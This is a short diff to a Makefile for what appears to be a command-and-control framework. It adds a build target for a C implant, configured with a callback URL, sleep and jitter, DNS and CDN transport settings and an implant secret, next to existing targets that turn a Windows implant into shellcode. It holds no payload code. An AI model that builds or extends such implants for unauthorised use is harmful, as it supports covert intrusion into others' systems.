@@ -35,7 +35,7 @@ LDFLAGS = -s -w \
 	-X '$(MODULE)/implant.dnsServer=$(DNS_SERVER)' \
 	-X '$(MODULE)/implant.cdnDomain=$(CDN_DOMAIN)'
 
-.PHONY: all proto teamserver implant implant-win implant-dll implant-shellcode operator clean
+.PHONY: all proto teamserver implant implant-win implant-dll implant-shellcode implant-c operator clean
 
 all: proto teamserver implant operator
 
@@ -68,6 +68,20 @@ implant-shellcode: implant-win
 	@mkdir -p $(BUILD_DIR)
 	go run ./cmd/tools/pe2shellcode -i $(BUILD_DIR)/implant.exe -o $(BUILD_DIR)/implant.bin
 
+implant-c:
+	$(MAKE) -C cimplant all \
+		IMPLANT_ID="$(IMPLANT_ID)" \
+		IMPLANT_SECRET="$(IMPLANT_SECRET)" \
+		CALLBACK_URL="$(CALLBACK_URL)" \
+		SLEEP_MS="$(SLEEP_MS)" \
+		JITTER_PCT="$(JITTER_PCT)" \
+		CA_CERT_PEM="$(CA_CERT_PEM)" \
+		TRANSPORT_TYPE="$(TRANSPORT_TYPE)" \
+		DNS_DOMAIN="$(DNS_DOMAIN)" \
+		DNS_SERVER="$(DNS_SERVER)" \
+		CDN_DOMAIN="$(CDN_DOMAIN)"
+
 clean:
 	rm -rf $(BUILD_DIR)
 	rm -f pkg/pb/*.go
+	$(MAKE) -C cimplant clean
